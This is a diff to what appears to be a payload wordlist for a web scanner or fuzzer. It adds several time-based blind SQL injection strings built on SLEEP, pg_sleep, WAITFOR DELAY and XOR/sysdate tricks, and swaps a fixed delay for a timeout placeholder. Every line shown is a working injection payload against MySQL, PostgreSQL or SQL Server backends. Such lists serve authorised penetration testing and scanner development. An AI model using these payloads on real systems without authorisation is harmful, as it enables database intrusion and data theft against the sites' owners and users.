@@ -1,10 +1,12 @@
 '+AND+(SELECT+2016+FROM+(SELECT(SLEEP(%__TIME_OUT__%)))SIfv)+AND+'vDZP'%3d'vDZP
+1 AND (SELECT 5230 FROM (SELECT(SLEEP(%__TIME_OUT__%)))SUmc
 'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%*1),0))OR'
 ``0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%*1),0))XOR'Z.php``
 "0'XOR(if(now()=sysdate(),sleep((%__TIME_OUT__%-1),0))XOR'Z"
 "0"XOR(if(now()=sysdate()%2Csleep(%__TIME_OUT__%)%2C0))XOR"Z"
 0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z
 0\"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR\"Z
+"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR"
 1 or pg_sleep(%__TIME_OUT__%)--
 1) or pg_sleep(%__TIME_OUT__%)--
 1)) or pg_sleep(%__TIME_OUT__%)--
@@ -44,6 +46,7 @@ or pg_SLEEP(%__TIME_OUT__%)--
 ")) or sleep(%__TIME_OUT__%)="
 ' or sleep(%__TIME_OUT__%)#
 ' or sleep(%__TIME_OUT__%)='
+' OR SLEEP(%__TIME_OUT__%/7) -
 ') or sleep(%__TIME_OUT__%)='
 ')) or sleep(%__TIME_OUT__%)='
 or SLEEP(%__TIME_OUT__%)
@@ -87,4 +90,5 @@ waitfor delay '%__TIME_OUT__%'--
 %' WAITFOR DELAY '%__TIME_OUT__%'--
 '))) WAITFOR DELAY '%__TIME_OUT__%'--
 ';WAITFOR DELAY '%__TIME_OUT__%'--
-'||pg_sleep(10)--
+'||pg_sleep(%__TIME_OUT__%)--
+' AnD SLEEP(%__TIME_OUT__%) ANd '1
